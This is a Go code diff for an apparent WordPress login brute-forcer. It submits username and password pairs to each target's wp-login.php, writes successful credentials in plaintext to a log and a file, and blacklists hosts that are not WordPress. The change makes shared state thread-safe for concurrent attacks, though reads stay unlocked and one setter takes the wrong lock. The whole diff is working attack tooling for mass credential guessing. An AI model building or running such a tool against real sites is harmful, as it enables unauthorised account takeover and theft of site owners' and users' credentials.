@@ -7,12 +7,16 @@ import (
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 )
 
+var Success = make(map[string]bool)
+var BlackList = make(map[string]bool)
+var sLock sync.Mutex
+var bLock sync.Mutex
+
 type WpGo struct {
-	http      Ghttp.Http
-	BlackList map[string]bool
-	Success   map[string]bool
+	http Ghttp.Http
 }
 
 func Write(line string) {
@@ -29,15 +33,14 @@ func Write(line string) {
 func NewWpGo() *WpGo {
 	w := WpGo{}
 	w.http = Ghttp.Http{}
-	w.BlackList = make(map[string]bool)
-	w.Success = make(map[string]bool)
 	return &w
 }
 func (w *WpGo) Login(siteTask SiteTask) {
 	if w.CheckIsBlack(siteTask) {
+		//log.Println("IsBlack ", siteTask)
 		return
 	}
-	log.Println(siteTask)
+	//log.Println(siteTask)
 	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
 	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
 	w.http.New("POST", uri)
@@ -52,19 +55,38 @@ func (w *WpGo) Login(siteTask SiteTask) {
 	cookie := w.http.RespCookie()
 	if strings.Contains(cookie, "wordpress_logged_in") {
 		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
-		w.Success[key] = true
+		w.SetSuccess(key)
 		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
 		log.Printf(line)
 		Write(line)
 	}
 
 }
+func (w *WpGo) GetSuccess(key string) bool {
+	return Success[key]
+}
+func (w *WpGo) SetSuccess(key string) {
+	sLock.Lock()
+	Success[key] = true
+	sLock.Unlock()
+	return
+}
+func (w *WpGo) GetBlack(key string) bool {
+	return BlackList[key]
+}
+func (w *WpGo) SetBlack(key string, t bool) {
+
+	sLock.Lock()
+	//log.Println("GetBlack ", key, t)
+	BlackList[key] = t
+	sLock.Unlock()
+}
 func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
-	if w.BlackList[siteTask.Host] {
+	if w.GetBlack(siteTask.Host) {
 		return true
 	}
 	key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
-	if w.Success[key] {
+	if w.GetSuccess(key) {
 		return true
 	}
 	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
@@ -80,10 +102,13 @@ func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
 	w.http.Execute()
 	cookie := w.http.RespCookie()
 	if strings.Contains(cookie, "wordpress_test_cookie") == false {
-		w.BlackList[siteTask.Host] = true
+		//w.BlackList[siteTask.Host] = true
+		//log.Println("cookie: ", cookie)
+		w.SetBlack(siteTask.Host, true)
 		return true
 	}
-	w.BlackList[siteTask.Host] = false
+	w.SetBlack(siteTask.Host, false)
+	//w.BlackList[siteTask.Host] = false
 	return false
 
 }
